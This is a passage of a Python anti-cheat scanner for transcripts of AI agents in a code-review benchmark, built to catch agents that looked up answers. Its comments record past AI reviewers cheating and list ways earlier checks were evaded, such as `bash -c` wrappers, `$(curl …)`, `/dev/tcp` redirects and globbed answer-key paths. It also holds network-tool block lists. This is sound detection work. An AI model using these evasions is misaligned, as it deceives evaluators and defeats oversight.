"""Detect an arm that used an oracle, and invalidate it rather than annotate it.

Three reviewers in the previous evaluation looked the answer up. One diffed against
upstream and reported the corpus as byte-identical to a named release; four of five
of that run's ground-truth hits came from it. Prompt text forbidding it did not
work, which is why the corpora are now ours and privately injected — but a defence
you cannot measure is a defence you do not have, so this scans what the arms
actually did.

**The distinction that matters.** The string `WebFetch` appears in almost every
transcript as a *tool definition*: the harness tells the model which tools exist,
and the arm packet itself says not to use them. A substring grep therefore flags
every arm, including the honest ones, and an anti-cheat check that always fires is
one that gets switched off. So nothing here greps raw text. Transcripts are parsed
as JSON and only `{"type": "tool_use"}` content blocks count as use. Definitions are
counted too — separately, and reported — because a run in which zero tools were
defined and zero invoked is a transcript this scanner failed to understand, and that
must fail loudly rather than pass quietly.

Three outcomes:

- **violation** — disqualifying, and the arm's numbers are excluded from the
  comparison: an oracle tool invoked *and answered*, a network binary run, the
  harness's own answer key read, a stray read outside the arm's own tree, an arm
  running the wrong protocol, or external sources declared by the arm itself.
- **blocked** — an oracle tool or a network command was invoked, and the platform's
  own record of the result shows it was denied before it reached the network: a
  `PreToolUse` guard runs during real measurements and rejects `WebFetch`/`WebSearch`
  and network shell commands, and a denied attempt is not the same claim as a
  successful one — no oracle data entered the arm's context, so it does not by
  itself take the cell out of the comparison. It is reported just as loudly as a
  violation, because intent still matters and a denial that is silently absorbed
  into "clean" is a defence nobody can audit. What counts as *denied* is narrow and
  literal, not inferred: the platform marks a denied call's `tool_result` record with
  a top-level `toolDenialKind` (`"permission-rule"` for a hook denial, observed
  verbatim in `~/c-review-bench-runs/2026-08-06-v3/n2` and `n1`) alongside
  `is_error: true` on the content block itself — see `_denied_tool_use_ids`. Only the
  violations a network guard could plausibly have intercepted are eligible for this
  downgrade (an oracle tool invocation, a network binary, a remote git/gh
  subcommand, a package-index fetch, an interpreter's inline network call); reading
  the answer key, straying outside the arm's tree, running the wrong protocol, and a
  self-declared consultation are never downgraded by a denial, because none of them
  is a claim a network guard could have blocked in the first place — they are
  established from the *content* of what the arm already has, or from what it says
  about itself, not from whether a request reached the wire.
- **advisory** — worth a human's eye, never disqualifying on its own: an oracle
  hostname or a CVE id mentioned in text, a `git` subcommand that reads nothing
  outside the tree.

Precision is bought with structure, not with cleverness: a Bash command is split on
shell separators and only the *first token* of each segment is matched against the
network-binary list, so `grep -rn curl .` and a file called `wget-notes.txt` do not
fire.
"""

from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any

# Tool names that reach outside the machine. Anything MCP-shaped that looks like a
# fetch, a search or a browser is treated the same way: this is a benchmark, and a
# tool that can read the internet can read a project's advisories.
ORACLE_TOOLS = {"webfetch", "websearch"}
# Substrings that make an MCP tool name a network tool. The first version listed only
# `web_search`, `web_fetch`, `browser`, `search_exa` and `fetch_url`, which let through
# every MCP server whose tool is called plainly `fetch`, `scrape` or `crawl` — and those
# are the common names. `fetch` and `download` are deliberately bare substrings: in a
# benchmark, a tool that fetches or downloads is an oracle whatever else its name says,
# and a cloud-drive read is an external source exactly as much as an HTTP GET is.
ORACLE_MCP_HINTS = (
    "web_search",
    "web_fetch",
    "websearch",
    "webfetch",
    "browser",
    "search_exa",
    "fetch",
    "crawl",
    "scrape",
    "download",
    "puppeteer",
    "playwright",
    "open_url",
    "read_url",
    "http_get",
    "urlopen",
)

# Interpreters that can open a socket in one line, so the binary name says nothing about
# whether the command reached the network. `curl` is caught by name; `python3 -c
# "urllib.request.urlopen(...)"` was not caught at all, and base64-obscuring the host made
# even the advisory disappear. The pairing rule below is what closes it.
SCRIPT_INTERPRETERS = {
    "python",
    "python2",
    "python3",
    "perl",
    "ruby",
    "node",
    "deno",
    "bun",
    "php",
    "osascript",
    "Rscript",
    "julia",
    "lua",
    "tclsh",
    "ghc",
    "runghc",
}
# Calls that open a connection. Paired with an interpreter these are a violation: there is
# no reading of a local corpus that needs them.
NETWORK_CALLS = (
    "urlopen",
    "urllib",
    "requests.get",
    "requests.post",
    "urlretrieve",
    "http.client",
    "httpx",
    "aiohttp",
    "socket.create_connection",
    "socket.connect",
    "net::http",
    "lwp::",
    "open-uri",
    "fetch(",
    "createconnection",
    "https.get",
    "http.get",
)
# A bare URL in a script is only an advisory. A recommendation string can legitimately
# contain one, and a violation excludes the arm from the comparison — too heavy a
# consequence for a URL that was printed rather than opened.
URL_SCHEMES = ("https://", "http://", "ftp://", "git://")
# Wrappers that hide the real binary one token to the right. Without this, `uv run python
# -c "urlopen(...)"` presents `uv` as the command and nothing matches.
RUNNER_PREFIXES = {("uv", "run"), ("poetry", "run"), ("pipx", "run"), ("pnpm", "exec")}
RUNNER_WORDS = {"uvx", "npx", "bunx", "xargs", "stdbuf"}
# Tools that answer "how do these two trees differ", which on this corpus is the answer key.
TREE_COMPARERS = {"diff", "cmp", "comm", "diff3", "vimdiff", "delta", "difft", "rsync", "meld"}

NETWORK_BINARIES = {
    "curl",
    "wget",
    "nc",
    "ncat",
    "netcat",
    "telnet",
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "ftp",
    "lynx",
    "links",
    "w3m",
    "http",
    "httpie",
    "aria2c",
    "youtube-dl",
    "svn",
    "hg",
    "cvs",
    "brew",
    "apt",
    "apt-get",
    "yum",
    "dnf",
    "pacman",
}
# Subcommands that reach a remote, or that read a history the corpus does not have.
GIT_REMOTE_SUBCOMMANDS = {"clone", "fetch", "pull", "remote", "ls-remote", "archive", "submodule"}
GIT_HISTORY_SUBCOMMANDS = {
    "log",
    "show",
    "diff",
    "blame",
    "checkout",
    "describe",
    "tag",
    "shortlog",
}
GH_SUBCOMMANDS = {"pr", "api", "repo", "issue", "release", "search", "gist", "browse"}
PACKAGE_FETCH = {
    ("pip", "download"),
    ("pip", "install"),
    ("npm", "view"),
    ("npm", "install"),
    ("uv", "pip"),
}

ORACLE_HOSTS = (
    "raw.githubusercontent.com",
    "github.com",
    "codeload.github.com",
    "gitlab.com",
    "bitbucket.org",
    "sourceforge.net",
    "savannah.gnu.org",
    "nvd.nist.gov",
    "cve.mitre.org",
    "cve.org",
    "cvedetails.com",
    "openwall.com",
    "seclists.org",
    "bugzilla",
    "sourceware.org",
    "googlesource.com",
    "kernel.org",
    "pypi.org",
    "npmjs.com",
    "crates.io",
    "debian.org",
    "ubuntu.com",
    "redhat.com",
)

# Paths that hold the answer key. The corpus tree never contains any of these, so a
# read is either a wrong turn or a look at the answers; either way the number is not
# a measurement.
# Anchored deliberately tightly. A first version matched `[-/]private/`, intending the
# harness's `<variant>-private/` directory, and matched macOS's `/private/tmp/...` — which
# is where the corpus itself lives. Every legitimate read of the code under review was
# reported as a violation, and the first real arm run scored INVALID for doing its job.
# An over-triggering integrity check is worse than none: it gets switched off.
ANSWER_KEY_PATTERNS = (
    # Not `ground_truth\.json`: a glob or a `find -name 'ground_truth*'` evaded that and
    # scored VALID. The stem is enough — no corpus contains the word.
    re.compile(r"ground_truth"),
    re.compile(r"verified\.json"),
    re.compile(r"maps\.json"),
    re.compile(r"recipe\.json"),
    # `bench-private/`, `control-private/`: the answer-key directory convention. The
    # `-private/` is required literally, so macOS's `/private/tmp` is not it — that
    # over-trigger scored the first honest arm INVALID for reading its own corpus. The
    # leading character class now admits glob metacharacters, because
    # `.../work/sigil/*-private/g*.json` reads the answer key just as effectively as
    # spelling it out and used to pass.
    re.compile(r"[A-Za-z0-9_.*?\[\]{}-]*-private/"),
    # The pre-de-identification tree. It is the diff that gives every injection away, and
    # it is only ever reachable under a `*-private/` path, but name it explicitly so a
    # future layout change does not silently drop it.
    re.compile(r"/staged/"),
    # The harness's own source, not a corpus directory that happens to be called tests/.
    # `judge_bench` is gone (the plugin's false-positive judge it benchmarked was removed
    # along with it), so it is not listed here to be read in the first place.
    re.compile(r"c-review[-/]bench/(?:lib|corpora|arms|tests)/"),
    # MEASUREMENTS.md carries per-bug outcomes for scored cells, so reading it during a
    # run is reading the answer key for any corpus already measured.
    re.compile(r"c-review[-/]bench/(?:README\.md|bench\.py|MEASUREMENTS\.md)"),
)

CVE_RE = re.compile(r"\bCVE-\d{4}-\d{3,7}\b", re.IGNORECASE)
# Shell separators, plus the two things that legitimately *contain* one: a quoted string
# and a heredoc body. Splitting blind cut `python3 -c "import socket; socket.create_
# connection(...)"` at the `;` inside the quotes, so the per-segment interpreter check saw
# only `python3 -c "import socket` and the network call landed in a segment whose first
# token is not an interpreter — nothing matched either half.
SEPARATORS = {"||", "&&", ";", "|", "\n", "&"}
SPLIT_RE = re.compile(
    r"'[^']*'"  # single-quoted string
    r"|\"[^\"]*\""  # double-quoted string
    # A heredoc, body and all. The newline after the delimiter word is required: without it
    # a shift inside a quoted grep pattern (`grep -n "a << b" .`) reads as an opener and
    # swallows the rest of the line.
    # Either quote around the delimiter, or none, but the same one on both sides: `<<"PY"`
    # is as common as `<<'PY'` and used to fall through to the plain `\n` split, which cut
    # the body away from the interpreter that owns it and disarmed the pairing rule.
    # The body is captured so `_classify_bash` can also classify it in its own right — see
    # there for why keeping it in one piece is not enough.
    r"|<<-?\s*(?P<hq>['\"]?)(?P<heredoc>\w+)(?P=hq)[^\n]*\n(?P<body>[\s\S]*?)(?P=heredoc)"
    r"|\|\||&&|[;|\n&]"  # the separators we actually split on
)
# Shells whose real command hides inside a quoted `-c` payload. The quote-aware split
# above deliberately keeps that payload in one piece, which is right for `python3 -c
# "import socket; ..."` and wrong here: `bash -c "cd /x && curl http://evil"` then presents
# `bash` as its only command name, and `bash` is in no list, so a fetch of upstream scored
# VALID. The payload is unwrapped and classified in its own right instead.
SHELL_WRAPPERS = {"sh", "bash", "zsh", "dash", "ksh", "ash"}
# The other two quoting layers, and the same blind spot as `sh -c`. `SRC=$(curl -s
# https://zlib.net/zlib.c)` has its assignment stripped as a prefix word and then owns no
# command name at all; `bash <(curl http://evil)` presents `bash` with no `-c` payload.
# Neither reached any check. The bodies are classified in their own right and blanked out
# of the remainder — a body is always strictly shorter, so the recursion terminates.
SUBST_OPENERS = ("$(", "<(", ">(", "`")
# A blanked substitution leaves a token SLOT behind, not nothing: erasing the span outright
# shifted every later argument left by one, so `git -C $(pwd) clone <url>` had `-C` consume
# `clone` and `_subcommand` returned the URL. Substituted in place, without surrounding
# space, so it also does not split the token it sits inside (`--git-dir=$(pwd)/.git`). It
# matches no binary, subcommand or interpreter, and `_segments` strips it in leading
# position exactly as it strips an assignment, so `$(echo sudo) curl …` still heads `curl`.
SUBST_PLACEHOLDER = "_SUBST_"
ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
PATH_RE = re.compile(r"/(?:[A-Za-z0-9_.*?@+~-]|\\ )+(?:/(?:[A-Za-z0-9_.*?@+~-]|\\ )*)*")


class Containment:
    """Which absolute paths this arm was given, and which ones are the answers.

    The name-pattern rules above catch a path *shaped* like an answer key. This catches a
    path that simply is not the arm's own tree, which is a stronger and simpler claim — and
    it is the one that was missing.

    The layout makes it necessary. `verify` emits, side by side under one work root:

        <workroot>/<corpus>/bench/            the tree the packet hands the arm
        <workroot>/<corpus>/control/          the same code with the bugs removed
        <workroot>/<corpus>/bench-private/    ground_truth.json, maps.json, staged/
        <workroot>/<corpus>/verified.json

    and `fetch_base` caches the pristine upstream tarball and its extraction in the parent
    of the default work root:

        ~/.cache/c-review-bench/zstream-<digest>-src/     un-de-identified zlib, ChangeLog and all

    So `diff -r ../bench ../control` lists every injected bug, and `ls ../..` finds the
    upstream the de-identifier exists to hide. Neither was detected: `diff -r` names no
    network binary and no answer-key filename, and `zstream-…-src/` matches no pattern.
    De-identification is a real defence against recalling upstream from training data; it
    is no defence at all against upstream being on the same disk, two directories up.

    Every arm packet already says to work only from the tree it was given, so this
    enforces the instruction rather than adding one.
    """

    def __init__(
        self, tree: Path | str, roots: list[Path | str], allow: list[Path | str] | None = None
    ) -> None:
        self.tree = self._forms(tree)
        self.roots = [form for r in roots if r for form in self._forms(r)]
        # The run directory is normally elsewhere, but nothing stops `plan --out` putting it
        # inside the work root, and the arm has to write its result there.
        self.allow = [form for a in (allow or []) if a for form in self._forms(a)]

    @staticmethod
    def _forms(path: Path | str) -> list[str]:
        """Every spelling of one path a transcript might contain.

        On macOS `/tmp` and `/var` are symlinks into `/private`, so `Path.resolve()` on the
        harness's own root yields `/private/tmp/...` while the agent's tool call says
        `/tmp/...` — and a containment check comparing the two finds nothing. This is the
        same trap that made `[-/]private/` match the corpus's own location and score the
        first honest arm INVALID; it is worth being explicit about both directions.
        """
        absolute = str(Path(path).absolute()).rstrip("/")
        resolved = str(Path(path).resolve()).rstrip("/")
        forms = {absolute, resolved}
        for form in (absolute, resolved):
            if form.startswith("/private/"):
                forms.add(form[len("/private") :])
            else:
                forms.add("/private" + form)
        return sorted(f for f in forms if f and f != "/")

    def _inside(self, path: str, roots: list[str]) -> bool:
        return any(path == root or path.startswith(root + "/") for root in roots)

    def violations_in(self, payload: str) -> list[str]:
        """Paths in this payload that are under a harness root but outside the arm's tree.

        Absolute paths only. A relative `diff -r ../bench ../control` cannot be resolved
        without the cwd of that particular tool call, so it is not caught here — the
        `-private/` name pattern and the tree-comparison rule in `_classify_bash` are what
        cover that case, and the gap is stated rather than assumed away.
        """
        out: list[str] = []
        for candidate in PATH_RE.findall(payload):
            path = candidate.rstrip("/")
            if self._inside(path, self.tree) or self._inside(path, self.allow):
                continue
            if self._inside(path, self.roots):
                out.append(path)
        return sorted(set(out))


class AntiCheatError(Exception):
    """The scan could not inspect anything. Callers exit non-zero."""


def _content_blocks(record: Any) -> list[dict[str, Any]]:
    """Every content block in one transcript record, whatever shape it arrived in."""
    blocks: list[dict[str, Any]] = []
    if not isinstance(record, dict):
        return blocks
    for holder in (record, record.get("message")):
        if not isinstance(holder, dict):
            continue
        content = holder.get("content")
        if isinstance(content, list):
            blocks += [b for b in content if isinstance(b, dict)]
    return blocks


def _defined_tools(record: Any) -> list[str]:
    """Tool *names offered* to the model, which are never evidence of use."""
    if not isinstance(record, dict):
        return []
    names: list[str] = []
    for key in ("tools", "availableTools", "allowed_tools", "allowedTools"):
        value = record.get(key)
        if isinstance(value, list):
            names += [str(v.get("name") if isinstance(v, dict) else v) for v in value]
    return names


def _denied_tool_use_ids(files: list[Path]) -> dict[str, str]:
    """Every `tool_use` id whose result shows the platform denied the call before it ran.

    Maps the id to the denial kind, so a blocked-attempt entry can say which. Found by
    inspecting two real transcripts recorded under a live network guard
    (`~/c-review-bench-runs/2026-08-06-v3/n2/logs/.../agent-aba9406eaec1b175e.jsonl`, a
    `WebFetch` to `raw.githubusercontent.com/madler/zlib`; `n1`'s `agent-a864e2b46bcf60ab0`,
    a `Bash` command a `PreToolUse` hook rejected). In both, the `tool_result` record for the
    denied call reads:

        {"message": {"role": "user", "content": [
            {"type": "tool_result", "content": "PreToolUse:WebFetch hook error: ... BLOCKED: ...",
             "is_error": true, "tool_use_id": "toolu_..."}
        ]}, "toolUseResult": "Error: PreToolUse:...", "toolDenialKind": "permission-rule", ...}

    `toolDenialKind` sits on the *record*, not inside the content block, and a broader scan
    of local project transcripts turned up a second value, `"user-rejected"` (an interactive
    decline rather than a hook), which is treated the same way: either means the call never
    reached the tool. Both `is_error: true` on the block and a non-empty `toolDenialKind` on
    the record are required before an id counts as denied — requiring both is the
    conservative choice; a call this scanner cannot positively identify as denied is left a
    full violation rather than guessed into the lighter category.
    """
    denied: dict[str, str] = {}
    for file in files:
        for raw in file.read_text(encoding="utf-8", errors="replace").splitlines():
            raw = raw.strip()
            if not raw:
                continue
            try:
                record = json.loads(raw)
            except json.JSONDecodeError:
                continue
            kind = record.get("toolDenialKind") if isinstance(record, dict) else None
            if not kind:
                continue
            for block in _content_blocks(record):
                tool_use_id = block.get("tool_use_id")
                if block.get("type") == "tool_result" and block.get("is_error") and tool_use_id:
                    denied[str(tool_use_id)] = str(kind)
    return denied


def _split(command: str) -> list[str]:
    """Split on shell separators, skipping the ones inside a quoted string or heredoc."""
    out: list[str] = []
    start = 0
    for match in SPLIT_RE.finditer(command):
        if match.group(0) in SEPARATORS:
            out.append(command[start : match.start()])
            start = match.end()
    out.append(command[start:])
    return out


def _substitutions(command: str) -> tuple[list[str], str]:
    """Bodies of every `$( )`, `` ` ` ``, `<( )` and `>( )`, and the rest with them blanked.

    An unterminated opener is not a substitution — a `$(` inside a quoted grep pattern is
    the common case — so it is left in the remainder as ordinary text.
    """
    bodies: list[str] = []
    rest: list[str] = []
    index = 0
    while index < len(command):
        opener = next((o for o in SUBST_OPENERS if command.startswith(o, index)), "")
        cursor = index + len(opener)
        depth = 1 if opener else 0
        while cursor < len(command) and depth:
            char = command[cursor]
            if opener == "`":
                depth -= char == "`"
            else:
                depth += (char == "(") - (char == ")")
            cursor += 1
        if depth or not opener:
            rest.append(command[index])
            index += 1
            continue
        bodies.append(command[index + len(opener) : cursor - 1])
        rest.append(SUBST_PLACEHOLDER)
        index = cursor
    return bodies, "".join(rest)


def _shell_payload(tokens: list[str]) -> str:
    """The script a `sh -c '…'` wrapper hides, unquoted. Empty when there is no `-c`."""
    for index, token in enumerate(tokens[1:], 1):
        # `-c`, and the bundled forms `-lc` / `-xc`; never a `--long` option.
        if token.startswith("-") and not token.startswith("--") and "c" in token:
            inner = " ".join(tokens[index + 1 :]).strip()
            if len(inner) > 1 and inner[0] in "'\"" and inner[-1] == inner[0]:
                inner = inner[1:-1]
            return inner
    return ""


def _segments(command: str) -> list[list[str]]:
    out: list[list[str]] = []
    for chunk in _split(command):
        tokens = [t for t in chunk.strip().split() if t]
        while tokens:
            head = Path(tokens[0].strip("'\"")).name
            if ASSIGN_RE.match(tokens[0]) or head in {
                "sudo",
                "env",
                "time",
                "nohup",
                "exec",
                SUBST_PLACEHOLDER,
                *RUNNER_WORDS,
            }:
                tokens = tokens[1:]
                continue
            if len(tokens) > 1 and (head, tokens[1]) in RUNNER_PREFIXES:
                tokens = tokens[2:]
                continue
            break
        if tokens:
            out.append(tokens)
    return out


def _subcommand(tokens: list[str]) -> str:
    """The first non-flag argument, which is where the subcommand actually is.

    `git clone` was caught and `git -C /tmp clone` was not, because the old form read
    `tokens[1]` and stopped. Same for `git --git-dir=… log`. Skipping flags — and the
    value of a flag that takes one — is the whole fix.
    """
    index = 1
    while index < len(tokens):
        token = tokens[index]
        if not token.startswith("-"):
            return token
        # `-C /tmp/x` consumes the next token; `--git-dir=/x` and `-q` do not.
        if "=" not in token and token in {"-C", "-c", "--git-dir", "--work-tree", "--exec-path"}:
            index += 1
        index += 1
    return ""


def _classify_bash(command: str) -> list[tuple[str, str, bool]]:
    """(severity, why, network_reaching) for one Bash command, matching on command position.

    The third element marks a violation as one a `PreToolUse` network guard could plausibly
    have denied before the command ran — a socket, a network binary, a remote git/gh
    subcommand, a package-index fetch, or an interpreter paired with an inline network call.
    Comparing the bench and control trees is deliberately excluded: that violation is about
    the *content* of a local `diff`, not about reaching outside the sandbox, and no guard
    that blocks network access would ever deny it — so a denial elsewhere in the same
    transcript must never be read as covering this one too.
    """
    found: list[tuple[str, str, bool]] = []
    # Command and process substitution are quoting layers exactly as `sh -c` is: classify
    # what they contain, then classify the remainder with their spans blanked.
    bodies, command = _substitutions(command)
    for body in bodies:
        found += _classify_bash(body)
    # A heredoc body is kept in one piece by the split, which is what the interpreter pairing
    # rule needs (`python3 - <<PY` owns its body's tokens) and is not enough on its own: `sh
    # <<EOF\ncurl …\nEOF` heads the segment with `sh`, `_shell_payload` finds no `-c`, and
    # nothing in the body was ever classified. So classify each body in its own right too,
    # without blanking it out. Matched through SPLIT_RE rather than a bare heredoc regex so a
    # `<<` inside a quoted argument is still consumed by the quote alternative first. A body
    # is strictly shorter than the command holding it, so the recursion terminates.
    for match in SPLIT_RE.finditer(command):
        if match.group("body") is not None:
            found += _classify_bash(match.group("body"))
    lowered = command.lower()
    # A shell redirect to /dev/tcp needs no binary at all: `exec 3<>/dev/tcp/host/80` has
    # `exec` stripped as a prefix word and then no recognisable command name, so nothing
    # matched it and the host only raised an advisory.
    if "/dev/tcp/" in lowered or "/dev/udp/" in lowered:
        found.append(("violation", "opened a socket through a /dev/tcp or /dev/udp redirect", True))
    for tokens in _segments(command):
        # Scope every per-segment test to THIS segment. Matching against the whole command
        # is how `grep -rn urlopen src/ ; python3 -c "print(1)"` — a routine security-review
        # command — was classified as an interpreter making a network call, which voids the
        # arm. The module's own rule is that only a segment's own tokens count.
        segment_lowered = " ".join(tokens).lower()
        binary = Path(tokens[0].strip("'\"")).name
        sub = _subcommand(tokens)
        # A shell wrapper is not a command, it is a quoting layer. Classify what it wraps;
        # the payload is strictly shorter each time, so the recursion terminates.
        if binary in SHELL_WRAPPERS:
            inner = _shell_payload(tokens)
            if inner:
                found += _classify_bash(inner)
                continue
        # Comparing the two variants of one corpus *is* the answer key: they differ in
        # exactly the injected bugs and nowhere else, which the `variants` gate check
        # proves. It needs no network and no answer-key filename, so nothing else here
        # sees it. Caught by name so a relative path is covered too.
        if (
            binary in TREE_COMPARERS
            and re.search(r"\bbench\b", segment_lowered)
            and "control" in segment_lowered
        ):
            found.append(
                (
                    "violation",
                    f"ran `{binary}` across the bench and control trees, which differ in exactly "
                    f"the injected bugs",
                    False,
                )
            )
        if binary in NETWORK_BINARIES:
            found.append(("violation", f"ran network binary `{binary}`", True))
        elif binary == "git" and sub in GIT_REMOTE_SUBCOMMANDS:
            found.append(("violation", f"ran `git {sub}`", True))
        elif binary == "git" and sub in GIT_HISTORY_SUBCOMMANDS:
            found.append(
                (
                    "advisory",
                    f"ran `git {sub}`; the corpus tree has no history of its own",
                    False,
                )
            )
        elif binary == "gh" and sub in GH_SUBCOMMANDS:
            found.append(("violation", f"ran `gh {sub}`", True))
        elif (binary, sub) in PACKAGE_FETCH:
            found.append(("violation", f"ran `{binary} {sub}`", True))
        elif binary in SCRIPT_INTERPRETERS:
            # An interpreter is not evidence of anything on its own — the arms are
            # expected to run one. It becomes a violation only paired with a call that
            # opens a connection, which keeps `python3 -c "print(1)"` clean. A bare URL
            # stays an advisory, because a printed recommendation may contain one and a
            # violation costs the arm its place in the comparison.
            call = next((i for i in NETWORK_CALLS if i in segment_lowered), "")
            if call:
                found.append(
                    (
                        "violation",
                        f"ran `{binary}` with a network call in the script (`{call}`)",
                        True,
                    )
                )
            else:
                scheme = next((s for s in URL_SCHEMES if s in segment_lowered), "")
                if scheme:
                    found.append(
                        (
                            "advisory",
                            f"ran `{binary}` on a script containing a {scheme} URL",
                            False,
                        )
                    )
    # The whole-command tests (`/dev/tcp`, the tree comparison) run again inside an
    # unwrapped `sh -c` payload, so the same hit can be appended twice. One command, one
    # entry per distinct reason.
    return list(dict.fromkeys(found))


# Arms that are *defined* as one agent. If one of these fans out it is a different arm,
# which the previous evaluation disqualified a baseline for — by reading the transcript by
# hand, because nothing checked it.
SINGLE_AGENT_ARMS = {"bare", "taxonomy"}
FANOUT_TOOLS = {"task", "agent"}
# The artifact under test. A baseline arm that runs it is not a baseline.
SUBJECT_MARKERS = ("c-review", "creview")


def _classify_arm_protocol(name: str, payload: str, arm: str | None) -> list[tuple[str, str, bool]]:
    """Did this arm run as its packet says?

    The README lists this as something the harness "cannot check", and on the strength of
    that nothing looked. It is checkable: the arm name and the tool invocations are both in
    hand. In the one real run, the `bare` cell — one generic agent, one prompt, the
    baseline every other arm is measured against — invoked `Skill(c-review:c-review)` on
    its second turn, because the packet's own words ("review this C code for security
    vulnerabilities") are what that skill's description triggers on. It then searched for
    the `Workflow` tool, did not get it, and fell back to reading by hand. The number was
    collected and reported as `bare`.

    Whether that particular run was contaminated in the end is a judgement for a human.
    That it was never surfaced is the defect.

    Neither violation here is network-reaching (the third element is always `False`): both
    are established from the *name* of the tool the arm invoked, not from whether it reached
    outside the sandbox, so a network guard would never deny either and there is nothing for
    a denial to downgrade.
    """
    if not arm:
        return []
    lowered_name = name.lower()
    lowered_payload = payload.lower()
    found: list[tuple[str, str, bool]] = []
    if arm != "c-review":
        subject = lowered_name in {"skill", "workflow"} and any(
            marker in lowered_payload for marker in SUBJECT_MARKERS
        )
        if subject:
            found.append(
                (
                    "violation",
                    f"arm {arm!r} invoked the artifact under test (`{name}` -> c-review), so it is "
                    f"not the baseline it is being compared as",
                    False,
                )
            )
    if arm in SINGLE_AGENT_ARMS and lowered_name in FANOUT_TOOLS:
        found.append(
            (
                "violation",
                f"arm {arm!r} is defined as exactly one agent and invoked `{name}`; a fan-out is "
                f"a different arm",
                False,
            )
        )
    return found


def _classify_tool(
    name: str,
    payload: str,
    containment: Containment | None = None,
    arm: str | None = None,
) -> list[tuple[str, str, bool]]:
    """(severity, why, network_reaching) for one tool invocation's name and input.

    The third element is `True` only for the oracle-tool-invocation violation: that is the
    one thing here a PreToolUse network guard can actually intercept before it runs. An
    answer-key read, a stray read outside the arm's tree, and an arm running the wrong
    protocol are all established from the payload's or the tool name's static content —
    no guard denies a `Read`, and there is no "the call never reached the file" story for
    them the way there is for a blocked `WebFetch`. See `assess`'s handling of `blocked` for
    why that distinction matters.
    """
    lowered = name.lower()
    found: list[tuple[str, str, bool]] = []
    if lowered in ORACLE_TOOLS or any(hint in lowered for hint in ORACLE_MCP_HINTS):
        found.append(("violation", f"invoked oracle tool `{name}`", True))
    for pattern in ANSWER_KEY_PATTERNS:
        match = pattern.search(payload)
        if match:
            found.append(
                (
                    "violation",
                    f"`{name}` touched the harness answer key ({match.group(0)})",
                    False,
                )
            )
            break
    if containment is not None:
        strayed = containment.violations_in(payload)
        if strayed:
            found.append(
                (
                    "violation",
                    f"`{name}` reached outside the tree this arm was given, into "
                    f"{', '.join(strayed[:3])}",
                    False,
                )
            )
    found += _classify_arm_protocol(name, payload, arm)
    if lowered not in ORACLE_TOOLS:
        for host in ORACLE_HOSTS:
            if host in payload.lower():
                found.append(("advisory", f"`{name}` input mentions {host}", False))
                break
    return found


def scan_transcripts(
    paths: list[Path],
    containment: Containment | None = None,
    arm: str | None = None,
) -> dict[str, Any]:
    """Parse every transcript and classify every tool invocation in it."""
    files: list[Path] = []
    for path in paths:
        if path.is_dir():
            files += sorted(path.rglob("*.jsonl"))
        elif path.is_file():
            files.append(path)
    if not files:
        raise AntiCheatError(
            f"no transcripts found in {[str(p) for p in paths]}. The anti-cheat gate cannot "
            f"clear an arm it never inspected; point --transcript at the session JSONL."
        )

    denied = _denied_tool_use_ids(files)

    violations: list[dict[str, Any]] = []
    advisories: list[dict[str, Any]] = []
    # Attempted, and the platform's own record shows it was denied before it reached the
    # network — see `_denied_tool_use_ids`. Reported like a violation (loudly, with the
    # transcript and input quoted) but never folded into `violations`: no oracle data
    # entered the context, so nothing here should cost the arm its place in the comparison.
    blocked: list[dict[str, Any]] = []
    invocations = 0
    definitions = 0
    parsed = 0
    unparsed = 0
    cve_mentions: set[str] = set()

    for file in files:
        for number, raw in enumerate(
            file.read_text(encoding="utf-8", errors="replace").splitlines(), 1
        ):
            raw = raw.strip()
            if not raw:
                continue
            try:
                record = json.loads(raw)
            except json.JSONDecodeError:
                unparsed += 1
                continue
            parsed += 1
            definitions += len(_defined_tools(record))
            for block in _content_blocks(record):
                if block.get("type") == "text":
                    cve_mentions |= {m.upper() for m in CVE_RE.findall(str(block.get("text", "")))}
                    continue
                if block.get("type") != "tool_use":
                    continue
                invocations += 1
                name = str(block.get("name", "?"))
                payload = json.dumps(block.get("input", {}), ensure_ascii=False)
                denial_kind = denied.get(str(block.get("id") or ""))
                hits = _classify_tool(name, payload, containment, arm)
                if name.lower() == "bash":
                    hits += _classify_bash(str((block.get("input") or {}).get("command", "")))
                for severity, why, network_reaching in hits:
                    entry = {
                        "transcript": str(file),
                        "line": number,
                        "tool": name,
                        "why": why,
                        "input": payload[:400],
                    }
                    if severity == "violation" and network_reaching and denial_kind:
                        entry["denied_by"] = denial_kind
                        blocked.append(entry)
                    elif severity == "violation":
                        violations.append(entry)
                    else:
                        advisories.append(entry)

    if parsed == 0:
        raise AntiCheatError(
            f"parsed zero JSON records from {len(files)} transcript file(s) "
            f"({unparsed} unparseable "
            f"line(s)). The scan inspected nothing, which is not the same as finding nothing."
        )
    if invocations == 0:
        raise AntiCheatError(
            f"found zero tool invocations across {len(files)} transcript file(s) but "
            f"{definitions} tool definition(s). Either the wrong file was passed or the format "
            f"changed; an arm that called no tools cannot have reviewed any code."
        )

    return {
        "transcripts": [str(f) for f in files],
        "records_parsed": parsed,
        "records_unparseable": unparsed,
        "tool_definitions_seen": definitions,
        "invocations_seen": invocations,
        "violations": violations,
        "advisories": advisories,
        "blocked": blocked,
        "cve_mentioned_in_text": sorted(cve_mentions),
    }


def assess(scan: dict[str, Any], declared: dict[str, Any] | None = None) -> dict[str, Any]:
    """Fold the transcript scan and the arm's own declaration into one verdict."""
    violations = list(scan["violations"])
    if declared and declared.get("external_sources_consulted"):
        violations.append(
            {
                "transcript": "(self-declared)",
                "line": 0,
                "tool": "declaration",
                "why": "the arm declared it consulted sources outside the corpus",
                "input": str(declared.get("external_sources_detail", ""))[:400],
            }
        )
    # How many declarations the check actually read. c-review declares
    # `hunter_external_sources` per hunter; an absent or empty list folds to
    # `external_sources_consulted: false`, which used to be indistinguishable in the output
    # from a run whose hunters all declared themselves clean. That is the exact shape of the
    # defect this repository has paid for twice — a contamination check printing "0 of 0
    # hunter group(s) flagged" while a reviewer had openly declared fetching upstream. The
    # transcript scan is the real defence; this number stops the declaration layer from
    # looking like a second one when it inspected nothing.
    declarations = int((declared or {}).get("declarations_seen") or 0)
    verdict = "INVALID" if violations else "VALID"
    return {
        **scan,
        "violations": violations,
        "verdict": verdict,
        "declarations_seen": declarations,
    }


def format_assessment(assessment: dict[str, Any]) -> str:
    declarations = assessment.get("declarations_seen", 0)
    blocked = assessment.get("blocked", [])
    lines = [
        f"anti-cheat: {assessment['verdict']} — {assessment['invocations_seen']} "
